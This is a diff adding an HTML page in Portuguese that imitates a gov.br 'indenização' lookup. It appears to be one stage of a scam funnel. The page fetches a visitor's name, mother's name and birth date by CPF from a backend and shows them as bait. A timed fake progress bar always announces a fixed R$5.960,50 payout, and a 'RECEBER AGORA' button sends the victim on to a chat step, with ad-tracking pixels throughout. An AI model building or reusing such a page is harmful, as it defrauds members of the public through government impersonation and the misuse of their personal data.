@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Consulta de Indenização - Etapa 2</title>
+
+	<!-- Google Fonts -->
+	<link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
+	
+	<!-- Plyr Video Player -->
+	<link rel="stylesheet" href="css/plyr.css">
+<script>
+    window.pixelId = "67c65ea78480a2789186da08";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+  </script><script
+      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+      data-utmify-prevent-subids
+      async
+      defer
+    ></script>
+
+
+	<style>
+		:root {
+			--primary-color: #1355B6;
+			--primary-hover: #0F4DA8;
+			--text-color: #333333;
+		}
+
+		body {
+			font-family: 'Roboto', sans-serif;
+			margin: 0;
+			padding: 0;
+			background-color: var(--primary-color);
+			color: var(--text-color);
+			min-height: 100vh;
+			display: flex;
+			flex-direction: column;
+			padding-top: 100px;
+		}
+
+		.header {
+			text-align: center;
+			padding: 15px;
+			background: var(--primary-color);
+			display: flex;
+			justify-content: center;
+			gap: 20px;
+			align-items: center;
+			margin-bottom: 0;
+		}
+
+		.header img {
+			height: 60px;
+			width: auto;
+			object-fit: contain;
+		}
+
+		.container {
+			max-width: 800px;
+			margin: 0 auto;
+			padding: 0 20px;
+			width: 100%;
+			box-sizing: border-box;
+		}
+
+		.content-box {
+			background: white;
+			padding: 25px;
+			border-radius: 25px;
+			box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+			max-width: 400px;
+			margin: -20px auto 0;
+			position: relative;
+			z-index: 2;
+		}
+
+		#progressBar {
+			width: 100%;
+			background-color: #f3f3f3;
+			margin: 15px 0;
+			border-radius: 10px;
+			overflow: hidden;
+		}
+
+		#progressBar div {
+			width: 0;
+			height: 15px;
+			background-color: #4caf50;
+			border-radius: 10px;
+			transition: width 0.5s ease;
+		}
+
+		.result-item {
+			display: flex;
+			align-items: center;
+			margin-bottom: 15px;
+			font-size: 14px;
+			color: #333333;
+		}
+
+		.icon {
+			width: 20px;
+			height: 20px;
+			margin-right: 10px;
+		}
+
+		#receberBtn {
+			background-color: var(--primary-color);
+			color: white;
+			border: none;
+			padding: 15px 30px;
+			border-radius: 8px;
+			font-weight: bold;
+			cursor: pointer;
+			width: 100%;
+			font-size: 16px;
+			text-transform: uppercase;
+			margin-top: 20px;
+			display: none;
+			transition: background-color 0.3s ease;
+		}
+
+		#receberBtn:hover {
+			background-color: var(--primary-hover);
+		}
+
+		video {
+			width: 100%;
+			max-width: 100%;
+			margin: 15px 0;
+			border-radius: 8px;
+		}
+
+		#progressText {
+			text-align: center;
+			margin-bottom: 15px;
+			font-weight: 500;
+			font-size: 14px;
+			color: #333333;
+		}
+
+		.privacy-terms {
+			text-align: center;
+			margin-top: 15px;
+			font-size: 12px;
+		}
+
+		.privacy-terms a {
+			color: var(--primary-color);
+			text-decoration: none;
+		}
+
+		@media (max-width: 600px) {
+			body {
+				padding-top: 80px;
+			}
+			.container {
+				padding: 10px;
+			}
+			
+			.content-box {
+				padding: 20px;
+			}
+
+			.header img {
+				height: 68px;
+			}
+		}
+		
+	</style>
+</head>
+<body>
+	<header class="header">
+        <img src="images/00000-1024x256.png" alt="Logo" width="800" height="200">
+	</header>
+
+	<div class="container">
+		<div class="content-box">
+			<p id="progressText">Atenção, o cálculo da sua indenização gov.br está sendo realizado, isso pode levar alguns minutos! Veja o vídeo abaixo</p>
+			
+			<div id="progressBar">
+				<div></div>
+			</div>
+
+			<video id="player" playsinline controls>
+				<source src="media/vsl.mp4" type="video/mp4">
+			</video>
+
+			<div id="result">
+				<div id="resultadoNome" class="result-item">
+					<img src="images/02.png" class="icon" alt="Nome Icone">
+					Nome: <span></span>
+				</div>
+				<div id="resultadoCPF" class="result-item">
+					<img src="images/01.png" class="icon" alt="CPF Icone">
+					CPF: <span></span>
+				</div>
+				<div id="resultadoMae" class="result-item">
+					<img src="images/03.png" class="icon" alt="Mãe Icone">
+					Nome da Mãe: <span></span>
+				</div>
+				<div id="resultadoNascimento" class="result-item">
+					<img src="images/04.png" class="icon" alt="Nascimento Icone">
+					Data de Nascimento: <span></span>
+				</div>
+				<div id="calculandoValor" class="result-item">
+					<img src="images/05.png" class="icon" alt="Dinheiro Icone">
+					Calculando valor da sua indenização...
+				</div>
+				
+				<button id="receberBtn" onclick="window.location.href='/chat'">
+					RECEBER AGORA
+				</button>
+
+				<div class="privacy-terms">
+					<a href="#">Termos de Uso de Aviso de Privacidade</a>
+				</div>
+			</div>
+		</div>
+	</div>
+
+	<!-- Script do Player de Vídeo -->
+	<script src="js/plyr.polyfilled.js"></script>
+	<script>
+		const player = new Plyr('#player', {
+			controls: [
+				'play-large',
+				'play',
+				'progress',
+				'current-time',
+				'duration',
+				'fullscreen'
+			]
+		});
+	</script>
+
+	<!-- Script Principal -->
+	<script>
+		function getQueryParam(param) {
+			const urlParams = new URLSearchParams(window.location.search);
+			return urlParams.get(param);
+		}
+
+		const cpf = getQueryParam('cpf');
+		const utm_source = getQueryParam('utm_source') || ''; // Use um valor padrão caso esteja vazio
+		const utm_medium = getQueryParam('utm_medium') || '';
+		const utm_campaign = getQueryParam('utm_campaign') || '';
+		const utm_id = getQueryParam('utm_id') || '';
+		const utm_term = getQueryParam('utm_term') || '';
+		const utm_content = getQueryParam('utm_content') || '';
+		const src = getQueryParam('src') || '';
+
+		const apiUrl = `consulta.php?cpf=${cpf}`;
+
+		function formatISOToShortDate(isoDateString) {
+			if (!isoDateString) return "Data inválida";
+			const date = new Date(isoDateString);
+			if (isNaN(date)) return "Data inválida";
+			const day = String(date.getDate()).padStart(2, '0');
+			const month = String(date.getMonth() + 1).padStart(2, '0');
+			const year = date.getFullYear();
+			return `${day}/${month}/${year}`;
+		}
+
+		function capitalizeWords(text) {
+			return text
+				.toLowerCase()
+				.split(' ')
+				.map(word => word.charAt(0).toUpperCase() + word.slice(1))
+				.join(' ');
+		}
+
+		function formatCPF(cpf) {
+			const cleanedCPF = cpf.replace(/\D/g, '');
+			return cleanedCPF.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+		}
+
+		// Buscar dados do CPF
+		fetch(apiUrl)
+			.then(response => response.json())
+			.then(data => {
+				if (data && data.dados && data.dados[0]) {
+					const nomeText = data.dados[0].NOME;
+					const capitalizedNomeText = capitalizeWords(nomeText);
+					
+					document.querySelector('#resultadoNome span').textContent = capitalizedNomeText;
+					document.querySelector('#resultadoCPF span').textContent = formatCPF(cpf);
+					
+					if (data.dados[0].NOME_MAE) {
+						const maeText = data.dados[0].NOME_MAE;
+						const capitalizedMaeText = capitalizeWords(maeText);
+						document.querySelector('#resultadoMae span').textContent = capitalizedMaeText;
+					} else {
+						document.querySelector('#resultadoMae span').textContent = "Nome da mãe não disponível";
+					}
+					
+					document.querySelector('#resultadoNascimento span').textContent = data.dados[0].NASC;
+				}
+			})
+			.catch(error => {
+				console.error('Erro:', error);
+			});
+
+		// Barra de Progresso
+		let width = 0;
+		const progressBar = document.querySelector('#progressBar div');
+		const calculandoValor = document.getElementById('calculandoValor');
+		const receberBtn = document.getElementById('receberBtn');
+
+		const interval = setInterval(() => {
+			if (width >= 100) {
+				clearInterval(interval);
+				calculandoValor.innerHTML = '<img src="images/05.png" class="icon" alt="Dinheiro Icone"> R$5.960,50 pronto para ser liberado';
+				receberBtn.style.display = 'block';
+			} else {
+				width += 100 / 106;
+				progressBar.style.width = width + '%';
+			}
+		}, 1000);
+
+// Captura os parâmetros da URL de etapa2
+
+
+// Modificação do redirecionamento no clique do botão
+receberBtn.addEventListener('click', function() {
+    const url = `../chat?cpf=${cpf}&utm_source=${utm_source}&utm_medium=${utm_medium}&utm_campaign=${utm_campaign}&utm_id=${utm_id}&utm_term=${utm_term}&utm_content=${utm_content}&src=${src}`;
+    window.location.href = url;
+});
+
+	</script>
+</body>
+</html>
